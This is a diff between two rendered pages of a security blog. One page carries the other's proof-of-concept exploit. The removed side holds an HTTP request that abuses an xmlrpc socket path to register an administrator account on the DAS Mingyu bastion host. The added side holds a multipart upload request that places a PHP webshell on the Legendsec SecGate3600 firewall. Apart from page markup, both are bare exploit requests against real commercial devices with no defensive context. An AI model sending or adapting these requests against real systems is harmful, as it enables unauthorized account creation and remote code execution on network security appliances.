@@ -16,23 +16,23 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="明御运维审计与风险控制系统堡垒机任意用户注册POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192">
+    <meta name="description" content="网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞POC马路径：attachements&#x2F;xxx.php 123456789101112131415161718192021POST &#x2F;?g&#x3D;obj_app_upfile HTTP&#x2F;1.1Host: x.x.x.xAccept: *&#x2F;*Accept-Encoding: gzip, deflateContent-Le">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安恒设备漏洞">
-<meta property="og:url" content="https://remixxyh.github.io/2023/08/11/%E5%AE%89%E6%81%92%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="网神防火墙漏洞">
+<meta property="og:url" content="https://remixxyh.github.io/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="3xsh0re">
-<meta property="og:description" content="明御运维审计与风险控制系统堡垒机任意用户注册POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192">
+<meta property="og:description" content="网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞POC马路径：attachements&#x2F;xxx.php 123456789101112131415161718192021POST &#x2F;?g&#x3D;obj_app_upfile HTTP&#x2F;1.1Host: x.x.x.xAccept: *&#x2F;*Accept-Encoding: gzip, deflateContent-Le">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-08-11T04:03:21.000Z">
-<meta property="article:modified_time" content="2023-08-12T02:08:40.468Z">
+<meta property="article:published_time" content="2023-08-11T03:57:36.000Z">
+<meta property="article:modified_time" content="2023-08-12T01:56:21.398Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="POC">
-<meta property="article:tag" content="安恒">
+<meta property="article:tag" content="网神">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>安恒设备漏洞 - 3xsh0re</title>
+  <title>网神防火墙漏洞 - 3xsh0re</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -227,7 +227,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="安恒设备漏洞"></span>
+            <span id="subtitle" data-typed-text="网神防火墙漏洞"></span>
           
         </div>
 
@@ -238,7 +238,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-11 12:03" pubdate>
+        <time datetime="2023-08-11 11:57" pubdate>
           2023年8月11日 中午
         </time>
       </span>
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          904 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          23 分钟
+          8 分钟
         
       </span>
     
@@ -306,12 +306,13 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">安恒设备漏洞</h1>
+            <h1 id="seo-header">网神防火墙漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="明御运维审计与风险控制系统堡垒机任意用户注册"><a href="#明御运维审计与风险控制系统堡垒机任意用户注册" class="headerlink" title="明御运维审计与风险控制系统堡垒机任意用户注册"></a>明御运维审计与风险控制系统堡垒机任意用户注册</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>LANG=zh;USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;,&quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br>User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/100.0.4896.127 Safari/537.36<br>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>noneSec-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>documentAccept-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1121<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>web.user_add<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>10.10.10.10<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">struct</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>uname<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>pwd<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>ABC123!@#<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>authmode<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>deptid<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>email<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mobile<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>comment<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>roleid<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>102<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">struct</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+                <h3 id="网神SecGate3600防火墙obj-app-upfile任意文件上传漏洞"><a href="#网神SecGate3600防火墙obj-app-upfile任意文件上传漏洞" class="headerlink" title="网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞"></a>网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>马路径：attachements&#x2F;xxx.php</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?g=obj_app_upfile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>574<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)<br>------WebKitFormBoundaryJpMyThWnAxbcBBQc<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;MAX_FILE_SIZE&quot;<br>10000000<br>------WebKitFormBoundaryJpMyThWnAxbcBBQc<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upfile&quot;; filename=&quot;vulntest.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br>&lt;?php php马?&gt;<br>------WebKitFormBoundaryJpMyThWnAxbcBBQc<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit_post&quot;<br>obj_app_upfile<br>------WebKitFormBoundaryJpMyThWnAxbcBBQc<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;__hash__&quot;<br>0b9d6b1ab7479ab69d9f71b05e0e9445<br>------WebKitFormBoundaryJpMyThWnAxbcBBQc--<br></code></pre></td></tr></table></figure>
 
 
                 
@@ -348,7 +349,7 @@
       
         <a href="/tags/POC/" class="print-no-link">#POC</a>
       
-        <a href="/tags/%E5%AE%89%E6%81%92/" class="print-no-link">#安恒</a>
+        <a href="/tags/%E7%BD%91%E7%A5%9E/" class="print-no-link">#网神</a>
       
     </div>
   
@@ -360,8 +361,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>安恒设备漏洞</div>
-      <div>https://remixxyh.github.io/2023/08/11/安恒设备漏洞/</div>
+      <div>网神防火墙漏洞</div>
+      <div>https://remixxyh.github.io/2023/08/11/网神防火墙漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -405,9 +406,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="广联达OA后台文件上传漏洞">
+                      <a href="/2023/08/11/%E5%AE%89%E6%81%92%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/" title="安恒设备漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">广联达OA后台文件上传漏洞</span>
+                        <span class="hidden-mobile">安恒设备漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -415,8 +416,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/" title="网神防火墙漏洞">
-                        <span class="hidden-mobile">网神防火墙漏洞</span>
+                      <a href="/2023/08/11/%E5%90%AF%E6%98%8E%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/" title="启明设备漏洞">
+                        <span class="hidden-mobile">启明设备漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
